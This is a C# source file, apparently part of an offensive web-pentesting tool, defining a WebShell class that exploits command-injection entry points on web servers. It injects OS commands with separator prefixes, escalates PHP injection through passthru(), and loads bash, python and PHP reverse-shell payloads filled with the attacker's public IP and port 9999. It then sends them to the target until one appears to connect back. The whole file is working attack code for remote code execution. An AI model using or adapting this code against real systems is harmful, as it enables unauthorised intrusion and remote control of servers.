using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Service;
using Service.Exploit;
using UnityEditorInternal;

namespace Machine
{
    public enum ShellType
    {
        Linux,
        Windows,
        Php,
        None
    }
    
    public class WebShell
    {
        private static ShellType IdentifyShell()
        {
            throw new NotImplementedException();
        }
        
        private bool _interactive;
        private ShellType _shellType;
        private InputWebService _entry;

        private bool _isUpgraded;
        
        public WebShell(InputWebService entry, ShellType shellType, bool interactive)
        {
            _entry = entry;
            _shellType = shellType;
            _interactive = interactive;

            Task<bool> task = Task.Run(async () => await IsActive());
            task.Wait();

            if (!task.Result)
            {
                throw new ArgumentException("Entry is not a valid entry point.");
            }

            string poc = $"{entry.GetUrl()}?{entry.GetParam()}=1;whoami;";
            
            AccessPoint accessPoint = new AccessPoint(entry.GetUrl(), poc, AccessPointType.RCE, 10);
            entry.Log(accessPoint);
        }

        public string PreProcessCommand(string command)
        {
            string preCommand = "";
            string postCommand = "";
            if (_shellType == ShellType.Linux || _shellType == ShellType.Windows)
            {
                preCommand = "1 & echo \"SECUStudioDEBUT\" && ";
                postCommand = " && echo \"SECUStudioFIN\"";
            }

            if (_isUpgraded)
            {
                preCommand = ";passthru(" + preCommand;
                postCommand += ");";
            }

            return preCommand + command + postCommand;
        }

        public async void Upgrade()
        {
            if (_shellType != ShellType.Php) return;
            
            string OS = await SendCommand("echo PHP_OS;");
            ShellType newShell = ShellType.None;
            OS = OS.ToUpper();
            if (OS.Contains("LINUX"))
                newShell = ShellType.Linux;
            else if (OS.Contains("WINDOWS"))
                newShell = ShellType.Windows;
            else if (OS.Contains("DARWIN"))
                // TODO: Properly implement MacOS shell
                newShell = ShellType.Linux;
            else
                throw new Exception($"Shell.Upgrade: Unexpected OS: \"{OS}\"");

            _shellType = newShell;
            _isUpgraded = true;
        }
        
        public async Task<string> SendCommand(string cmd)
        {
            cmd = PreProcessCommand(cmd);
            string result = await _entry.Submit(cmd);
            
            Regex filter = new Regex(
                "(?<!echo \")(?>SECUStudioDEBUT\"?)(?<result>.*?)(?<!echo \")(?>\"?SECUStudioFIN)",
                // SingleLine is an option telling Regex to treat newline as an ordinary characters
                // (usually Regex matches are separated by newlines) 
                RegexOptions.Singleline 
            );
            
            result = filter.Match(result).Groups["result"].Value;
            return result;
        }

        public async Task<bool> IsActive()
        {
            const string needle = "SECU";
            return (await SendCommand($"echo \"{needle}\"")).Contains(needle);
        }

        /// <summary>
        /// Add payloads from Binaries/reverse_shells/{type}_shells.txt to the payload list.
        /// </summary>
        private async Task AddPayloads(List<string> payloadList, string type)
        {

            string ip = Utils.MakeRequest("https://api.ipify.org/");
            if (Utils.DEBUG)
                ip = "127.0.0.1";
            string port = "9999"; // Default port for reverse shell. CHANGE ME if needed
            
            string path = Path.Combine("Binaries", "reverse_shells", $"{type.ToLower()}_shells.txt");
            using (StreamReader sr = new StreamReader(path))
            {
                string all = await sr.ReadToEndAsync();
                string[] unpreparedPayloads = all.Split(
                    new[] {'\r', '\n'},
                    StringSplitOptions.RemoveEmptyEntries);
                foreach (string unpreparedPayload in unpreparedPayloads)
                {
                    string preparedPayload = unpreparedPayload.Replace("<IP>", ip);
                    preparedPayload = preparedPayload.Replace("<PORT>", port);
                    payloadList.Add(preparedPayload);
                }
            }
        }

        public async void EstablishReverseShell()
        {
            List<string> payloads = new List<string>();

            switch (_shellType)
            {
                case ShellType.Linux:
                    await AddPayloads(payloads, "bash");
                    await AddPayloads(payloads, "python");
                    break;
                case ShellType.Php:
                    await AddPayloads(payloads, "php");
                    break;
                default:
                    throw new NotImplementedException();
            }
            
            foreach (string payload in payloads)
            {
                int timeout = 1000;
                Task<string> task = SendCommand(payload);
                if (await Task.WhenAny(task, Task.Delay(timeout)) == task)
                {
                    // Web request did not stop execution, payload was not successful.
                    continue;
                }
                
                // Web request timed out, high probability that it stopped execution
                // Either reverse shell worked, either server is down (or bad internet connection)
                return;
            }
        }
    }
}